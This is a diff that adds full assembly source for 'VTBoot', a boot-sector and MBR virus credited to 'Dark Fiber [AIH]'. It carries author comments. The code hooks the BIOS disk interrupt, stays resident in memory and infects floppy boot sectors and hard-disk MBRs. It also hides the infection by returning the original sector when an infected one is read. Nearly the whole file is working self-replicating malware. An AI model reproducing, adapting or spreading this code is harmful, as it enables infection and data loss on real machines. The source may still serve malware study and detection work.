@@ -1,0 +1,221 @@
+
+comment %
+
+
+ Family : VTBoot
+  Title : VTBoot
+Variant : #18
+ Author : Dark Fiber [AIH]
+ Origin : Australia
+   Date : ?
+Warhead : N\A
+   Type : Boot + MBR with full stealth. only about 240 bytes
+          (Eeeeeek. where then did i come up with the figure of 116 bytes? ;)
+
+%
+
+ORG_LEN EQU 03F                 ;How far into the bootsector our code
+                                ;will start
+ORG 0                           ;Set it to binary
+JMP SHORT $1                    ;Jump it
+
+BOOTPB:
+DB ORG_LEN-BOOTPB DUP (?)       ;Null it
+
+SECTOR: DB 0                    ;What sector is the host boot on.
+
+$1:                             ;Get i13h
+XOR AX,AX                       ;Clear DS
+MOV DS,AX
+INT 12H                         ;Get the top of memory
+DEC AX                          ;Subtract 1kb
+MOV W[0413],AX                  ;Save new memory size
+SHL AX,6                        ;Convert it from kbs to paragraphs
+MOV ES,AX                       ;Set the destination to the top of memory
+
+CLD                             ;Move our code up there
+MOV CX,512/2                    ;512/2
+XOR DI,DI                       ;Clear destination
+MOV SI,07C00                    ;This is where we started life at
+REP MOVSW                       ;Move it
+
+MOV SI,04C                      ;Why not just a movsw... heheheh
+MOV DI,OFFSET $3+1              ;Set dest to i13h far jump
+
+MOVSW                           ;+1
+MOVSW                           ;+3 in the far jump to the old i13h
+DEC SI,2                        ;Set i13h
+MOV W[SI-2],INT13H
+MOV W[SI],ES
+
+PUSH ES                         ;Set data seg
+POP DS
+
+PUSH ES,VIR_RET                 ;Jump to code in top of memory
+RETF
+
+VIR_RET:
+PUSH CX                         ;CX == 0
+POP ES                          ;Set ES to 0
+
+DRIVE:
+MOV DL,0                        ;Get the drive number
+MOV AX,0201                     ;Read 1 sector
+INC CX
+MOV BX,07C00                    ;Into bootup position
+INT 13H                         ;Go!
+
+PUSH ES                         ;Set ds to es
+POP DS
+
+PUSH ES,BX                      ;Run old boot code
+RETF
+
+INT13H:                         ;Our i13h code
+PUSHF                           ;Unzip me fly. oops, me flag.
+
+CMP AH,2                        ;Read?
+JE STEALTH
+
+CMP AH,0FE                      ;Stealth read
+JB $4
+
+ADD AH,4                        ;Add 4 to make it a legit read
+
+$4:
+POPF                            ;Dohickey the flags
+
+$3:
+JMP 0000:0000                   ;Jump to bios i13h
+
+STEALTH:
+CMP CX,1                        ;From the first sector
+JNE $4
+CMP DH,CH                       ;From the first head
+JNE $4
+
+POPF
+
+MOV AH,0FE                      ;Stealth read it into memory
+INT 13H
+
+PUSHF                           ;Save regs
+PUSHA
+PUSH ES,DS
+JC RETZ1                        ;Error reading sector then quit
+
+PUSH ES                         ;Get sector segment
+POP DS
+
+STRING:
+CMP B[BX+1],ORG_LEN-1           ;Is it infected?
+JE RETZ1                        ;Yes then don't infect it
+                                ;This checks the jump offset.....
+
+INFEX:
+PUSH CS                         ;Set extra segment
+POP ES
+
+CLD
+MOV CX,512                      ;Copy the viral code to our code segment
+MOV DI,OFFSET ENDV
+MOV SI,BX
+REP MOVSB
+
+PUSH CS                         ;Data seg to our code seg
+POP DS
+
+MOV B[DRIVE+1],DL               ;Save drive for bootup
+
+MOV DH,CH                       ;Set it to head 0 for hd
+MOV CL,7                        ; and sector 7
+
+TEST DL,80                      ;Check for a hd
+JNE $D1
+
+$D2:
+PUSH DX                         ;Save drive
+
+MOV BX,W[FENT1]                 ;1. Multiply entries in root by 32
+SHR BX,4                        ;2. Divide by 512 (sector size)
+XOR AX,AX                       ;3. Then multiply sectors per fat by copies of
+MOV AL,B[COPYF]                 ;   fat
+MUL W[SECPF]                    ;5. Add this to other value
+ADD BX,AX                       ;6. Subtract the number of sectors per track
+MOV CX,BX                       ;
+INC CX                          ;
+SUB CX,W[SECPT]                 ;
+
+POP DX                          ;Restore drive
+INC DH                          ;Increment head
+
+;For those of you who are wondering what the above does, it just finds
+;out the location of the last sector in the root directory entires
+;This stops me from having wads of lookup tables like all the other
+;viruses and tons of compare statements.... Plus i get the added bonus
+;of it working on ANY disk size... (In theory anyway)
+
+$D1:
+MOV SI,OFFSET SECTOR            ;Point to head of viral code
+MOV B[SI],CL                    ;Save sector
+
+MOV AX,0FF01                    ;Stealth write to disk
+MOV BX,OFFSET ENDV              ;The original boot sector
+INT 13H
+
+MOV W[BX],(OFFSET $1-2)*256 + 0EB       ;Set our jump to the viral code
+
+;SI == SECTOR
+;BX == INFECTED BOOT SECTOR\MBR
+
+LEA DI,[SI+512]                 ;Copy viral code into old host code
+MOV CX,BUFLEN                   ;To make it look less suspicious
+REP MOVSB
+
+;WRITE THE VIRUS TO BOOT SECTOR
+MOV DH,CH                       ;Now write the viral code to boot sector
+MOV AX,0FF01
+INC CX
+INT 13H
+JMP SHORT RETZ3
+
+
+;This piece of code stealths any infected reads from the user.
+
+RETZ1:
+MOV DH,1                        ;Head 1
+MOV CL,B[BX+SECTOR]             ;Get the sector number
+CMP CL,7                        ;If hard disk then make it head 0
+JNE RETZ2
+
+XOR DH,DH                       ;Clear head
+
+RETZ2:
+MOV AX,0FE01                    ;Read original host code
+INT 13H
+
+RETZ3:
+POP DS,ES                       ;Restore regs
+POPA
+POPF
+
+TRET:
+RETF 2                          ;Quit.. Don't use IRET coz boot loads will
+                                ;hang....
+
+db "DF[AIH]"                    ;Well, a little txt string won't hurt
+
+XRET:
+BUFLEN          EQU $-SECTOR
+
+DB 01FE-XRET DUP (?)
+
+DB 055,0AA
+
+ENDV:
+
+FENT1           EQU ENDV+011                    ;ENTRIES IN ROOT
+SECPF           EQU ENDV+016                    ;SECTER PER FAT
+COPYF           EQU ENDV+010                    ;COPYIES OF FAT
+SECPT           EQU ENDV+018                    ;SECTERS PER TRACK
+
